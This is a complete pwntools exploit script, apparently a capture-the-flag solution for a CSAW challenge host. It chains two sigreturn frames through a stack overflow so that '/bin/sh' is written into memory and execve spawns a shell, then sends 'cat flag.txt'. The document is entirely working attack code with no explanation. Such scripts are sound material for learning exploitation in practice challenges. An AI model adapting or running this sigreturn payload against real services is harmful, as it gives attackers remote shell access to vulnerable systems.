from pwn import *

context.arch = 'amd64'

pop_rax = 0x40018a
syscall_ret = 0x400185
mov_eax_0xf_syscall = 0x400180
data_addr = 0x601000

p = remote("pwn.chal.csaw.io", 8000)

frame1 = SigreturnFrame()
frame1.rax = 0
frame1.rdi = 0
frame1.rsi = data_addr
frame1.rdx = 0x400
frame1.rip = syscall_ret
frame1.rsp = data_addr + 0x100

payload = b'A' * 40
payload += p64(mov_eax_0xf_syscall)
payload += bytes(frame1)

frame2 = SigreturnFrame()
frame2.rax = 59
frame2.rdi = data_addr
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_ret

# data2 is what lands at 0x601000 after the second read
data2 = b'/bin/sh\x00'
data2 = data2.ljust(0x100, b'\x00')
data2 += p64(0xdeadbeef)
data2 += p64(pop_rax) + p64(0xf) + p64(mov_eax_0xf_syscall)
data2 += bytes(frame2)

# First read consumes 512 bytes = payload (296) + 216 bytes of filler
filler = b'B' * 216

full = payload + filler + data2 + b'cat flag.txt\n'
p.send(full)
print(p.recvall(timeout=5).decode('latin-1'))
